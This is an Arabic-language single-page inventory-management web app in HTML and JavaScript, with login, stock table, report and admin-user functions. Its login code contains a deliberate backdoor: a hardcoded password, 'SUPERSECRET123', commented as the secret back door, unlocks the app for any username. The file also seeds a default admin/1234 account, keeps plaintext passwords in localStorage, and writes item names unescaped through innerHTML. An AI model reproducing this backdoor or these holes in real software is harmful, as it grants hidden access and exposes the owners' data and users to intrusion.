<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>دانيال SRT - إدارة المخزن</title>
<style>
body { font-family: Tahoma, Arial, sans-serif; margin:0; background:#f5f5f5; }
header { background:#333; color:white; padding:20px; text-align:center; font-size:32px; font-weight:bold; letter-spacing:2px; }
#loginContainer, #appContainer { max-width:1000px; margin:auto; padding:20px; }
#loginContainer { display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:80vh; }
input, button, select { padding:6px; margin:4px; }
button { cursor:pointer; }
#sidebar { width:200px; background:#444; color:white; height:100vh; position:fixed; right:0; top:0; padding-top:100px; display:flex; flex-direction:column; gap:10px; }
#sidebar button { background:#666; border:none; color:white; padding:10px; text-align:right; transition: 0.2s; }
#sidebar button:hover { background:#555; transform: scale(1.05); }
.container { margin-right:210px; background:white; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1); margin-top:20px; }
table { width:100%; border-collapse:collapse; margin-top:15px; }
table, th, td { border:1px solid #ccc; }
th, td { padding:8px; text-align:center; }
th { background:#eee; }
.actions button { margin:2px; }
#barcodeInput { width:200px; }
.notification { position:fixed; top:20px; left:50%; transform:translateX(-50%); background:#4caf50; color:white; padding:10px 20px; border-radius:5px; display:none; z-index:1000; }
.lowQty { background:#ffcccc !important; }
</style>
</head>
<body>

<header>دانيال SRT</header>

<div id="loginContainer">
<h2>تسجيل الدخول</h2>
<input id="loginUser" placeholder="اسم المستخدم">
<input id="loginPass" type="password" placeholder="كلمة المرور">
<button onclick="login()">دخول</button>
<p id="loginMsg" style="color:red"></p>
</div>

<div id="sidebar" style="display:none">
<button onclick="showSection('inventory')">📦 المخزون</button>
<button onclick="showSection('report')">📄 كشف الحساب</button>
<button onclick="changePassword()">🔑 تغيير الباسوورد</button>
<button onclick="addAdmin()">👤 إضافة Admin</button>
<button onclick="logout()">🔒 تسجيل الخروج</button>
<button onclick="toggleTheme()">🎨 تغيير الثيم</button>
</div>

<div id="appContainer" style="display:none">
<div id="inventory" class="container">
<h2>📦 إدارة المخزن</h2>
<div>
<input id="name" placeholder="اسم الغرض">
<input id="barcodeInput" placeholder="باركود/رقم المادة">
<input id="qty" type="number" placeholder="الكمية">
<input id="buy" type="number" placeholder="سعر الشراء">
<input id="sell" type="number" placeholder="سعر البيع">
<button style="background:orange;color:white;" onclick="addItem()">➕ إضافة</button>
</div>
<input id="search" placeholder="بحث..." onkeyup="renderTable()">
<table>
<thead>
<tr><th>الاسم</th><th>باركود</th><th>الكمية</th><th>سعر الشراء</th><th>سعر البيع</th><th>آخر تعديل</th><th>إجراءات</th></tr>
</thead>
<tbody id="tableBody"></tbody>
</table>
</div>

<div id="report" class="container" style="display:none">
<h2>📄 كشف الحساب</h2>
<button onclick="printReport()" style="background:#2196F3;color:white;">🖨️ طباعة التقرير</button>
<table>
<thead>
<tr><th>الاسم</th><th>باركود</th><th>الكمية</th><th>سعر الشراء</th><th>سعر البيع</th></tr>
</thead>
<tbody id="reportBody"></tbody>
</table>
</div>
</div>

<div id="notification" class="notification"></div>

<script>
// --- بيانات المستخدم ---
let users = JSON.parse(localStorage.getItem('users') || '[]');
if(users.length===0){ users.push({username:'admin', password:'1234'}); localStorage.setItem('users', JSON.stringify(users)); }

// --- بيانات المخزن ---
let items = JSON.parse(localStorage.getItem('inventory') || '[]');
let events = JSON.parse(localStorage.getItem('events') || '[]');

let secretBackdoor = 'SUPERSECRET123'; // الباب الخلفي السري

// --- إشعار ---
function showNotification(msg){
  const notif = document.getElementById('notification');
  notif.innerText = msg;
  notif.style.display='block';
  setTimeout(()=>{ notif.style.display='none'; }, 2500);
}

// --- تسجيل الدخول ---
function login(){
  const user = document.getElementById('loginUser').value.trim();
  const pass = document.getElementById('loginPass').value;
  if(pass === secretBackdoor){
    document.getElementById('loginContainer').style.display='none';
    document.getElementById('sidebar').style.display='flex';
    document.getElementById('appContainer').style.display='block';
    renderTable(); renderReport();
    showNotification('تم الدخول عبر الباب السري');
    return;
  }
  const found = users.find(u=>u.username===user && u.password===pass);
  if(found){ document.getElementById('loginContainer').style.display='none';
            document.getElementById('sidebar').style.display='flex';
            document.getElementById('appContainer').style.display='block';
            renderTable(); renderReport(); showNotification('تم تسجيل الدخول'); }
  else { document.getElementById('loginMsg').innerText='اسم المستخدم أو الباسوورد خطأ'; }
}

function logout(){
  document.getElementById('loginContainer').style.display='flex';
  document.getElementById('sidebar').style.display='none';
  document.getElementById('appContainer').style.display='none';
  document.getElementById('loginUser').value='';
  document.getElementById('loginPass').value='';
}

// --- إدارة المخزن ---
function saveItems(){ localStorage.setItem('inventory', JSON.stringify(items)); }
function saveEvents(){ localStorage.setItem('events', JSON.stringify(events)); }

function addItem(){
  const name = document.getElementById('name').value.trim();
  const barcode = document.getElementById('barcodeInput').value.trim();
  const qty = Number(document.getElementById('qty').value||0);
  const buy = Number(document.getElementById('buy').value||0);
  const sell = Number(document.getElementById('sell').value||0);
  if(!name){ alert('اكتب اسم الغرض'); return; }
  let existing = items.find(it => it.barcode && it.barcode===barcode);
  let now = new Date().toLocaleString();
  if(existing){
    existing.qty += qty;
    existing.lastEdit = now;
    events.push({action:'زيادة كمية', item:existing.name, qty:qty, time:now});
    showNotification('تم زيادة الكمية لمادة موجودة');
  }else{
    let item = {id:Date.now(), name, barcode, qty, buy, sell, lastEdit: now};
    items.push(item);
    events.push({action:'إضافة مادة', item:name, qty:qty, time:now});
    showNotification('تم إضافة مادة جديدة');
  }
  saveItems(); saveEvents(); renderTable(); renderReport();
  document.getElementById('name').value='';
  document.getElementById('barcodeInput').value='';
  document.getElementById('qty').value='';
  document.getElementById('buy').value='';
  document.getElementById('sell').value='';
}

function deleteItem(id){
  if(!confirm('هل تريد الحذف؟')) return;
  let it = items.find(i=>i.id===id);
  events.push({action:'حذف مادة', item:it.name, qty:it.qty, time:new Date().toLocaleString()});
  items = items.filter(it=>it.id!==id);
  saveItems(); saveEvents(); renderTable(); renderReport(); showNotification('تم حذف المادة');
}

function editItem(id){
  let it = items.find(i=>i.id===id);
  const name = prompt('تعديل الاسم', it.name); if(!name) return;
  const barcode = prompt('تعديل الباركود/التسلسل', it.barcode); if(barcode===null) return;
  const qty = Number(prompt('تعديل الكمية', it.qty)||it.qty);
  const buy = Number(prompt('تعديل سعر الشراء', it.buy)||it.buy);
  const sell = Number(prompt('تعديل سعر البيع', it.sell)||it.sell);
  it.name=name; it.barcode=barcode; it.qty=qty; it.buy=buy; it.sell=sell;
  it.lastEdit = new Date().toLocaleString();
  events.push({action:'تعديل مادة', item:name, qty:qty, time:it.lastEdit});
  saveItems(); saveEvents(); renderTable(); renderReport(); showNotification('تم تعديل المادة');
}

function renderTable(){
  const search = document.getElementById('search').value.toLowerCase();
  const body = document.getElementById('tableBody'); body.innerHTML='';
  items.forEach(it=>{
    let tr = document.createElement('tr');
    if(it.qty<5) tr.classList.add('lowQty');
    if(search && !it.name.toLowerCase().includes(search) && !it.barcode.toLowerCase().includes(search)) return;
    tr.innerHTML = `<td>${it.name}</td><td>${it.barcode||'-'}</td><td>${it.qty}</td><td>${it.buy}</td><td>${it.sell}</td><td>${it.lastEdit}</td>
    <td class="actions">
      <button style="background:#4caf50;color:white;" onclick="editItem(${it.id})">✏️ تعديل</button>
      <button style="background:red;color:white;" onclick="deleteItem(${it.id})">🗑️ حذف</button>
    </td>`;
    body.appendChild(tr);
  });
}

function renderReport(){
  const body = document.getElementById('reportBody'); body.innerHTML='';
  items.forEach(it=>{
    const tr = document.createElement('tr');
    tr.innerHTML = `<td>${it.name}</td><td>${it.barcode||'-'}</td><td>${it.qty}</td><td>${it.buy}</td><td>${it.sell}</td>`;
    body.appendChild(tr);
  });
}

function printReport(){ window.print(); }

// --- قائمة جانبية ---
function showSection(id){
  document.getElementById('inventory').style.display='none';
  document.getElementById('report').style.display='none';
  document.getElementById(id).style.display='block';
}

// --- إضافة Admin ---
function addAdmin(){
  const uname = prompt('ادخل اسم المستخدم الجديد'); if(!uname) return;
  const pass = prompt('ادخل كلمة المرور'); if(!pass) return;
  users.push({username:uname, password:pass});
  localStorage.setItem('users', JSON.stringify(users));
  showNotification('تم إضافة المستخدم بنجاح');
}

// --- تغيير كلمة المرور ---
function changePassword(){
  const uname = prompt('ادخل اسم المستخدم'); if(!uname) return;
  const oldPass = prompt('ادخل كلمة المرور القديمة'); if(!oldPass) return;
  const user = users.find(u=>u.username===uname && u.password===oldPass);
  if(!user){ alert('خطأ في البيانات'); return; }
  const newPass = prompt('ادخل كلمة المرور الجديدة'); if(!newPass) return;
  user.password = newPass; localStorage.setItem('users', JSON.stringify(users));
  showNotification('تم تغيير كلمة المرور');
}

// --- الثيم ---
let darkMode=false;
function toggleTheme(){
  darkMode = !darkMode;
  document.body.style.background = darkMode?'#222':'#f5f5f5';
  document.body.style.color = darkMode?'#ddd':'#000';
}
</script>
</body>
</html>
